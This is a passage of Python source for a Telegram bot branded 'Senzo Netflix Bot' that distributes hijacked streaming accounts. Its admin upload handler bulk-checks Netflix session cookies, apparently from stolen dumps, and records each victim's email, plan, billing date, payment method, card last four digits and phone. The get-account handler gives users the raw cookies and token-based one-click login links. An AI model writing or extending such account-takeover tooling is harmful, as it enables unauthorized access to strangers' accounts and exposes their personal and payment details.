                for pattern in [r'"userGuid"\s*:\s*"([^"]+)"', r'"ownerGuid"\s*:\s*"([^"]+)"']:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        user_guid = match.group(1).strip()
                        break
                
                is_subscribed = plan_key != "FREE" or (membership_status and "current_member" in membership_status.lower())
                
                nftoken = None
                nftoken_expiry = None
                if cookies_dict.get("NetflixId"):
                    nftoken, nftoken_expiry = generate_nftoken(cookies_dict.get("NetflixId"))
                
                log_daily_stats(hits=1 if is_subscribed else 0, free=1 if not is_subscribed else 0, bad=0)
                
                return {
                    "valid": True,
                    "subscribed": is_subscribed,
                    "email": email,
                    "name": name,
                    "country": country,
                    "plan": plan,
                    "plan_key": plan_key,
                    "plan_label": plan_label,
                    "streams": streams,
                    "quality": "HD",
                    "price": price,
                    "billing_date": billing,
                    "membership_status": membership_status,
                    "profiles": profiles_str,
                    "user_guid": user_guid,
                    "nftoken": nftoken,
                    "nftoken_expiry": nftoken_expiry,
                }
            except Exception:
                if attempt < MAX_RETRIES - 1:
                    continue
                return {"valid": False, "error": "Error"}
        return {"valid": False, "error": "Max retries exceeded"}
    except Exception:
        return {"valid": False, "error": "Error"}

# ============================================================
# TELEGRAM BOT HANDLERS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        user_id = user.id
        create_user(user_id, safe_str(user.username), safe_str(user.first_name))
        user_data = get_user(user_id)
        
        if safe_bool(user_data.get("is_banned")):
            await update.message.reply_text("🚫 You are banned.")
            return
        
        if safe_bool(user_data.get("pending_report")):
            await update.message.reply_text(
                "⚠️ **You have a pending report!**\n\n"
                "Please upload a screenshot proof.\n\n"
                "👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        stats = get_total_accounts()
        plan_display = ""
        for plan, count in stats.get('plans', {}).items():
            emoji = {"PREMIUM": "👑", "STANDARD": "⭐", "BASIC": "🎯", "MOBILE": "📱", "FREE": "🆓"}.get(plan, "📦")
            plan_display += f"│ {emoji} {plan}: **{count}**\n"
        if not plan_display:
            plan_display = "│ No accounts available\n"
        
        assigned = get_assigned_account(user_id)
        keyboard = [
            [InlineKeyboardButton("🎯 Get Account", callback_data="get_account")],
        ]
        if assigned:
            keyboard.append([
                InlineKeyboardButton("✅ Working", callback_data="working"),
                InlineKeyboardButton("❌ Not Working", callback_data="notworking"),
            ])
        keyboard.append([
            InlineKeyboardButton("📞 Contact Admin", callback_data="contact"),
            InlineKeyboardButton("📊 My Status", callback_data="my_status"),
        ])
        if safe_bool(user_data.get("is_admin")) or user_id in ADMIN_IDS:
            keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
        
        text = f"""
🌟 **WELCOME TO SENZO NETFLIX BOT** 🌟
━━━━━━━━━━━━━━━━━━━━━
👋 Hello **{safe_str(user.first_name)}**!
━━━━━━━━━━━━━━━━━━━━━
📊 **ACCOUNT STATUS**
┌─────────────────────
│ 📦 Total Available: **{safe_int(stats.get('total'))}**
{plan_display}└─────────────────────
⚙️ **YOUR STATS**
┌─────────────────────
│ ✅ Working Reports: **{safe_int(user_data.get('working_reports'))}**
│ ❌ Not Working: **{safe_int(user_data.get('notworking_reports'))}**
│ 📦 Accounts Used: **{safe_int(user_data.get('accounts_used'))}/{MAX_ACCOUNTS_PER_USER}**
│ ⚠️ Warnings: **{safe_int(user_data.get('warnings'))}/3**
└─────────────────────
⏳ Cooldown: **{WORKING_COOLDOWN_MINUTES} min**
━━━━━━━━━━━━━━━━━━━━━
🔽 **SELECT AN OPTION BELOW**
👨‍💻 **Developer:** @Senzo268
"""
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        logger.error(f"start error: {e}")

async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        user_data = get_user(user_id)
        
        if safe_bool(user_data.get("is_banned")):
            await query.edit_message_text("🚫 You are banned.")
            return
        
        can_get, msg = can_get_account(user_id)
        if not can_get:
            await query.edit_message_text(msg)
            return
        
        account = assign_account(user_id)
        if not account:
            await query.edit_message_text("❌ No accounts available.")
            return
        
        cookie_full = safe_str(account.get('cookies', 'No cookies available'))
        if len(cookie_full) > 3900:
            cookie_display = cookie_full[:3900] + "\n\n... (cookie truncated)"
        else:
            cookie_display = cookie_full
        
        text = f"""
🎉 **ACCOUNT ASSIGNED!**
━━━━━━━━━━━━━━━━━━━━━
📧 **Email:** `{safe_str(account.get('email'))}`
👤 **Name:** {safe_str(account.get('account_name'))}
🌍 **Country:** {safe_str(account.get('country'))}
📦 **Plan:** {safe_str(account.get('plan'))}
🛡️ **Status:** {safe_str(account.get('membership_status'), 'Active')}
📺 **Streams:** {safe_int(account.get('streams'))}
💰 **Price:** {safe_str(account.get('price'), 'N/A')}
🗓️ **Billing:** {safe_str(account.get('billing_date'))}
👥 **Extra Member:** {'✅ Yes' if safe_bool(account.get('extra_member')) else '❌ No'}
🎭 **Profiles:** {safe_str(account.get('profiles'), 'None')}
🆔 **GUID:** `{safe_str(account.get('user_guid'))}`
━━━━━━━━━━━━━━━━━━━━━
🍪 **Cookie:**
`{cookie_display}`
━━━━━━━━━━━━━━━━━━━━━
"""
        keyboard = []
        token = safe_str(account.get('nftoken'))
        
        if token and len(token) > 10:
            keyboard.append([
                InlineKeyboardButton("📱 Phone Login", url=f"https://netflix.com/unsupported?nftoken={token}"),
                InlineKeyboardButton("🖥️ PC Login", url=f"https://netflix.com/login?nftoken={token}")
            ])
            keyboard.append([
                InlineKeyboardButton("📺 TV Login", url=f"https://netflix.com/tv8?nftoken={token}")
            ])
            if safe_str(account.get('nftoken_expiry')):
                text += f"\n⏳ NFToken expires: `{safe_str(account.get('nftoken_expiry'))}`"
        else:
            keyboard.append([
                InlineKeyboardButton("📱 Phone Login", url="https://netflix.com/unsupported"),
                InlineKeyboardButton("🖥️ PC Login", url="https://netflix.com/login")
            ])
            keyboard.append([
                InlineKeyboardButton("📺 TV Login", url="https://netflix.com/tv8")
            ])
            text += "\n\n💡 Use cookie with cookie editor extension."
        
        text += "\n\n✅ **After testing, report below:**"
        keyboard.append([
            InlineKeyboardButton("✅ Working", callback_data=f"report_working_{account['id']}"),
            InlineKeyboardButton("❌ Not Working", callback_data=f"report_notworking_{account['id']}")
        ])
        keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")])
        text += "\n\n👨‍💻 **Developer:** @Senzo268"
        
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        logger.error(f"get_account error: {e}")

async def working_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        user_data = get_user(user_id)
        
        if safe_bool(user_data.get("pending_report")):
            await query.edit_message_text("⚠️ You have a pending report! Upload screenshot first.")
            return
        
        assigned = get_assigned_account(user_id)
        if not assigned:
            await query.edit_message_text("⚠️ No active account! Get Account first.")
            return
        
        db.execute_turso('''
            UPDATE users 
            SET pending_report = 1, pending_report_account_id = ?, pending_report_type = 'working'
            WHERE user_id = ?
        ''', (assigned["id"], user_id))
        db.commit_turso()
        
        await query.edit_message_text(
            "✅ **Report: WORKING**\n\n"
            "📸 **Please upload a screenshot proof.**\n\n"
            "👨‍💻 **Developer:** @Senzo268",
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception as e:
        logger.error(f"working_callback error: {e}")

async def notworking_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        user_data = get_user(user_id)
        
        if safe_bool(user_data.get("pending_report")):
            await query.edit_message_text("⚠️ You have a pending report! Upload screenshot first.")
            return
        
        assigned = get_assigned_account(user_id)
        if not assigned:
            await query.edit_message_text("⚠️ No active account! Get Account first.")
            return
        
        db.execute_turso('''
            UPDATE users 
            SET pending_report = 1, pending_report_account_id = ?, pending_report_type = 'notworking'
            WHERE user_id = ?
        ''', (assigned["id"], user_id))
        db.commit_turso()
        
        await query.edit_message_text(
            "❌ **Report: NOT WORKING**\n\n"
            "📸 **Please upload a screenshot proof.**\n\n"
            "👨‍💻 **Developer:** @Senzo268",
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception as e:
        logger.error(f"notworking_callback error: {e}")

async def handle_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        user_data = get_user(user_id)
        
        if not safe_bool(user_data.get("pending_report")):
            await update.message.reply_text("❌ No pending report.")
            return
        
        photo = update.message.photo
        if not photo:
            await update.message.reply_text("❌ Please upload an image.")
            return
        
        account_id = safe_int(user_data.get("pending_report_account_id"))
        report_type = safe_str(user_data.get("pending_report_type"))
        file_id = photo[-1].file_id
        
        try:
            cur = db.execute_turso('''
                INSERT INTO reports (user_id, account_id, report_type, screenshot_file_id)
                VALUES (?, ?, ?, ?)
            ''', (user_id, account_id, report_type, file_id))
            report_id = cur.lastrowid
            
            if report_type == "working":
                db.execute_turso('UPDATE users SET working_reports = working_reports + 1 WHERE user_id = ?', (user_id,))
            else:
                db.execute_turso('UPDATE users SET notworking_reports = notworking_reports + 1 WHERE user_id = ?', (user_id,))
            
            db.execute_turso('''
                UPDATE users 
                SET pending_report = 0, pending_report_account_id = NULL, pending_report_type = NULL
                WHERE user_id = ?
            ''', (user_id,))
            db.commit_turso()
            
        except Exception as e:
            logger.error(f"Report insert error: {e}")
            await update.message.reply_text("❌ Error saving report.")
            return
        
        await update.message.reply_text(
            f"✅ **Report submitted!**\n\n"
            f"Report ID: #{report_id}\n"
            f"Type: {report_type.upper()}\n\n"
            f"👨‍💻 **Developer:** @Senzo268",
            parse_mode=ParseMode.MARKDOWN
        )
        
        release_account(account_id)
        
    except Exception as e:
        logger.error(f"handle_screenshot error: {e}")
        await update.message.reply_text("❌ Error processing report.")

async def my_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        user = get_user(user_id)
        account = get_assigned_account(user_id)
        
        text = f"""
📊 **YOUR STATUS**
━━━━━━━━━━━━━━━━━━━━━
👤 **Name:** {safe_str(user.get('first_name'))}
🆔 **ID:** `{user_id}`
📅 **Joined:** {safe_str(user.get('joined_at'))}
━━━━━━━━━━━━━━━━━━━━━
📈 **STATISTICS**
┌─────────────────────
│ ✅ Working Reports: **{safe_int(user.get('working_reports'))}**
│ ❌ Not Working: **{safe_int(user.get('notworking_reports'))}**
│ 📦 Accounts Used: **{safe_int(user.get('accounts_used'))}/{MAX_ACCOUNTS_PER_USER}**
│ ⚠️ Warnings: **{safe_int(user.get('warnings'))}/3**
└─────────────────────
🔑 **CURRENT ACCOUNT:**
"""
        if account:
            text += f"""
┌─────────────────────
│ 📧 `{safe_str(account.get('email'))}`
│ 🌍 {safe_str(account.get('country'))}
│ 📦 {safe_str(account.get('plan'))}
│ 📺 {safe_int(account.get('streams'))} streams
└─────────────────────
"""
        else:
            text += "❌ None\n"
        
        text += f"\n⏳ **Cooldown:** {WORKING_COOLDOWN_MINUTES} min"
        text += "\n\n👨‍💻 **Developer:** @Senzo268"
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        logger.error(f"my_status error: {e}")

async def contact_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            "📝 **CONTACT ADMIN**\n\n"
            "Type your message below.\n"
            "👨‍💻 **Developer:** @Senzo268",
            parse_mode=ParseMode.MARKDOWN
        )
        context.user_data["waiting_for_message"] = True
    except Exception as e:
        logger.error(f"contact_admin error: {e}")

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await start(update, context)
    except Exception as e:
        logger.error(f"back_to_menu error: {e}")

# ============================================================
# ADMIN PANEL
# ============================================================

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        if user_id not in ADMIN_IDS:
            await query.answer("⛔ Not authorized!", show_alert=True)
            return
        
        stats = get_total_accounts()
        keyboard = [
            [InlineKeyboardButton("📤 Upload Stock", callback_data="admin_upload")],
            [InlineKeyboardButton("📦 Manage Stock", callback_data="admin_stock_mgr")],
            [InlineKeyboardButton("👁️ View Reports", callback_data="admin_reports")],
            [InlineKeyboardButton("👥 Manage Users", callback_data="admin_users")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
            [InlineKeyboardButton("⚙️ Channels", callback_data="admin_channels")],
            [InlineKeyboardButton("📊 Stock Logs", callback_data="admin_stock_logs")],
            [InlineKeyboardButton("📈 Dashboard", callback_data="admin_dashboard")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")],
        ]
        text = f"""
⚙️ **ADMIN PANEL**
━━━━━━━━━━━━━━━━━━━━━
🖥️ **SYSTEM STATUS**
┌─────────────────────
│ Status: **🟢 ONLINE**
│ Database: **Turso (Persistent) + SQLite (Accounts)**
│ Available: **{safe_int(stats.get('total'))}**
└─────────────────────
👨‍💻 **Developer:** @Senzo268
"""
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        logger.error(f"admin_panel error: {e}")

async def admin_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        if user_id not in ADMIN_IDS:
            await query.answer("⛔ Not authorized!", show_alert=True)
            return
        
        await query.edit_message_text(
            "📤 **UPLOAD COOKIE FILE**\n\n"
            "Send a **.txt**, **.json**, or **.zip** file.\n\n"
            "⚠️ Accounts will be saved to SQLite (temporary).\n"
            "👨‍💻 **Developer:** @Senzo268",
            parse_mode=ParseMode.MARKDOWN
        )
        context.user_data["waiting_for_upload"] = True
    except Exception as e:
        logger.error(f"admin_upload error: {e}")

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("⛔ Not authorized!")
            return
        
        if not context.user_data.get("waiting_for_upload"):
            return
        
        document = update.message.document
        if not document:
            await update.message.reply_text("❌ Please send a file.")
            return
        
        file_name = document.file_name
        if not file_name.lower().endswith(('.txt', '.json', '.zip')):
            await update.message.reply_text("❌ Please send .txt, .json, or .zip.")
            return
        
        status_msg = await update.message.reply_text(f"⏳ Processing **{file_name}**...", parse_mode=ParseMode.MARKDOWN)
        
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        cookie_pairs = extract_cookie_pairs(content)
        if not cookie_pairs:
            await status_msg.edit_text("❌ No Netflix cookies found.")
            context.user_data["waiting_for_upload"] = False
            return
        
        total = len(cookie_pairs)
        valid = 0
        accounts = []
        
        await status_msg.edit_text(f"🔄 Checking {total} cookies...")
        
        for i, (nid, sid) in enumerate(cookie_pairs):
            cookies_dict = {"NetflixId": nid}
            if sid:
                cookies_dict["SecureNetflixId"] = sid
            result = check_account(cookies_dict)
            
            if result.get("valid") and result.get("subscribed"):
                cookie_text = get_cookie_text(nid, sid)
                accounts.append({
                    "email": safe_str(result.get("email")),
                    "country": safe_str(result.get("country")),
                    "plan": safe_str(result.get("plan_label", "Unknown")),
                    "cookies": cookie_text,
                    "nftoken": safe_str(result.get("nftoken")),
                    "nftoken_expiry": safe_str(result.get("nftoken_expiry")),
                    "source_file": file_name,
                    "account_name": safe_str(result.get("name")),
                    "streams": safe_int(result.get("streams")),
                    "quality": safe_str(result.get("quality")),
                    "price": safe_str(result.get("price")),
                    "billing_date": safe_str(result.get("billing_date")),
                    "member_since": safe_str(result.get("member_since")),
                    "payment_method": safe_str(result.get("payment_method")),
                    "card_last4": safe_str(result.get("card_last4")),
                    "phone": safe_str(result.get("phone")),
                    "extra_member": safe_bool(result.get("extra_member")),
                    "membership_status": safe_str(result.get("membership_status")),
                    "email_verified": safe_bool(result.get("email_verified")),
                    "profiles": safe_str(result.get("profiles")),
                    "user_guid": safe_str(result.get("user_guid")),
                })
                valid += 1
            
            if (i + 1) % 10 == 0 or (i + 1) == total:
                await status_msg.edit_text(f"🔄 Checking... {i+1}/{total} | ✅ Valid: {valid}")
        
        if accounts:
            saved = save_account_batch(accounts)
            log_stock(user_id, file_name, total, saved)
            await status_msg.edit_text(
                f"✅ **UPLOAD COMPLETE!**\n\n"
                f"📁 File: {file_name}\n"
                f"🔍 Total: {total}\n"
                f"✅ Valid: {valid}\n"
                f"💾 Saved to DB: {saved}\n\n"
                f"📊 Available accounts now: {get_total_accounts().get('total')}\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await status_msg.edit_text(
                f"❌ **NO VALID ACCOUNTS FOUND!**\n\n"
                f"📁 File: {file_name}\n"
                f"🔍 Total: {total}\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN
            )
        
        context.user_data["waiting_for_upload"] = False
    except Exception as e:
        logger.error(f"handle_file_upload error: {e}")
        context.user_data["waiting_for_upload"] = False

async def admin_stock_mgr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        if user_id not in ADMIN_IDS:
            await query.answer("⛔ Not authorized!", show_alert=True)
            return
        
        accounts = get_available_accounts()
        stats = get_total_accounts()
        
        text = f"""
📦 **STOCK MANAGER**
━━━━━━━━━━━━━━━━━━━━━
📊 Total Available: **{stats.get('total')}**
📋 Showing: **{len(accounts)}** accounts
━━━━━━━━━━━━━━━━━━━━━
"""
        keyboard = []
        
        if not accounts:
            text += "❌ No accounts in stock.\n"
        else:
            for acc in accounts[:10]:
                text += f"▫️ ID #{acc['id']} | `{safe_str(acc['email'])}` | {safe_str(acc['plan'])}\n"
                keyboard.append([InlineKeyboardButton(f"🗑️ Delete #{acc['id']}", callback_data=f"del_acc_{acc['id']}")])
        
        if len(accounts) > 10:
            text += f"\n... and {len(accounts) - 10} more"
        
        keyboard.append([InlineKeyboardButton("🗑️ Clear All Stock", callback_data="clear_stock")])
        keyboard.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel")])
        
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        logger.error(f"admin_stock_mgr error: {e}")

async def delete_account_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        if user_id not in ADMIN_IDS:
            return
        
        data = query.data
        if data.startswith("del_acc_"):
            acc_id = int(data.split("_")[2])
            delete_account(acc_id)
            await query.answer(f"✅ Account #{acc_id} deleted!")
            await admin_stock_mgr(update, context)
        elif data == "clear_stock":
            db.execute_sqlite('DELETE FROM accounts')
            db.commit_sqlite()
            await query.answer("✅ All accounts cleared!")
            await admin_stock_mgr(update, context)
    except Exception as e:
        logger.error(f"delete_account_callback error: {e}")

async def admin_reports(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text("📋 Reports section\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass

async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text("👥 Users section\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text("📢 Broadcast section\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass

async def admin_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text("⚙️ Channels section\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass

async def admin_stock_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text("📊 Stock Logs section\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass

async def admin_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        stats = get_total_accounts()
        
        # Get user count
        cur = db.execute_turso('SELECT COUNT(*) FROM users')
        users_count = cur.fetchone()[0] or 0
        
        # Get report count
        cur = db.execute_turso('SELECT COUNT(*) FROM reports WHERE status = "pending"')
        pending_reports = cur.fetchone()[0] or 0
        
        text = f"""
📈 **DASHBOARD**
━━━━━━━━━━━━━━━━━━━━━
📦 **Available Stock:** {stats.get('total')}
👥 **Total Users:** {users_count}
📋 **Pending Reports:** {pending_reports}
━━━━━━━━━━━━━━━━━━━━━
🗄️ **Database:**
┌─────────────────────
│ Turso: Persistent Data
│ SQLite: Accounts (temp)
└─────────────────────
👨‍💻 **Developer:** @Senzo268
"""
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
    except Exception:
        pass

async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if context.user_data.get("waiting_for_message"):
            await update.message.reply_text(
                "✅ **Message sent to admin!**\n\n"
                "👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN
            )
            context.user_data["waiting_for_message"] = False
            return
        
        await start(update, context)
    except Exception:
        pass

# ============================================================
# DEBUG COMMAND
# ============================================================

async def debug_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check account database status."""
    try:
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("⛔ Not authorized!")
            return
        
        # SQLite stats
        cur = db.execute_sqlite('SELECT COUNT(*) FROM accounts')
        total = cur.fetchone()[0] or 0
        
        cur = db.execute_sqlite('SELECT COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1')
        available = cur.fetchone()[0] or 0
        
        cur = db.execute_sqlite('SELECT COUNT(*) FROM accounts WHERE status = "assigned"')
        assigned = cur.fetchone()[0] or 0
        
        cur = db.execute_sqlite('SELECT status, COUNT(*) FROM accounts GROUP BY status')
        statuses = cur.fetchall()
        
        status_text = ""
        for s in statuses:
            status_text += f"│ {s[0]}: **{s[1]}**\n"
        
        if not status_text:
            status_text = "│ No accounts found!\n"
        
        # Turso stats
        turso_cur = db.execute_turso('SELECT COUNT(*) FROM users')
        users = turso_cur.fetchone()[0] or 0
        
        text = f"""
📊 **DATABASE STATUS**
━━━━━━━━━━━━━━━━━━━━━
🗄️ **SQLite (Accounts)**
📦 Total: **{total}**
✅ Available: **{available}**
🔒 Assigned: **{assigned}**
━━━━━━━━━━━━━━━━━━━━━
📋 **Status Breakdown**
┌─────────────────────
{status_text}└─────────────────────
━━━━━━━━━━━━━━━━━━━━━
🗄️ **Turso (Users)**
👥 Total Users: **{users}**
━━━━━━━━━━━━━━━━━━━━━
👨‍💻 **Developer:** @Senzo268
"""
        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ============================================================
# MAIN
# ============================================================

def main():
    print("=" * 70)
    print("🎬 SENZO NETFLIX BOT - DUAL DATABASE EDITION")
    print("=" * 70)
    print(f"🗄️ Turso (Persistent): {'✅ Connected' if db.use_turso else '❌ Not Connected'}")
    print(f"🗄️ SQLite (Accounts): ✅ Connected")
    print(f"👤 Admins: {ADMIN_IDS}")
    print(f"📢 Channel: {REPORT_CHANNEL_ID if REPORT_CHANNEL_ID else 'NOT SET'}")
    print(f"⏳ Cooldown: {WORKING_COOLDOWN_MINUTES} min")
    print("=" * 70)
    
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ BOT_TOKEN not set!")
        return
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", start))
    application.add_handler(CommandHandler("debug", debug_accounts))
    
    # Callbacks
    application.add_handler(CallbackQueryHandler(get_account, pattern="^get_account$"))
    application.add_handler(CallbackQueryHandler(working_callback, pattern="^working$"))
    application.add_handler(CallbackQueryHandler(notworking_callback, pattern="^notworking$"))
    application.add_handler(CallbackQueryHandler(contact_admin, pattern="^contact$"))
    application.add_handler(CallbackQueryHandler(my_status, pattern="^my_status$"))
    application.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back_menu$"))
    
    # Admin callbacks
    application.add_handler(CallbackQueryHandler(admin_panel, pattern="^admin_panel$"))
    application.add_handler(CallbackQueryHandler(admin_upload, pattern="^admin_upload$"))
    application.add_handler(CallbackQueryHandler(admin_stock_mgr, pattern="^admin_stock_mgr$"))
    application.add_handler(CallbackQueryHandler(delete_account_callback, pattern="^(del_acc_|clear_stock)"))
    application.add_handler(CallbackQueryHandler(admin_reports, pattern="^admin_reports$"))
    application.add_handler(CallbackQueryHandler(admin_users, pattern="^admin_users$"))
    application.add_handler(CallbackQueryHandler(admin_broadcast, pattern="^admin_broadcast$"))
    application.add_handler(CallbackQueryHandler(admin_channels, pattern="^admin_channels$"))
    application.add_handler(CallbackQueryHandler(admin_stock_logs, pattern="^admin_stock_logs$"))
    application.add_handler(CallbackQueryHandler(admin_dashboard, pattern="^admin_dashboard$"))
    
    # Message handlers
    application.add_handler(MessageHandler(filters.PHOTO, handle_screenshot))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_text_messages))
    
    try:
        print("🚀 Starting bot...")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
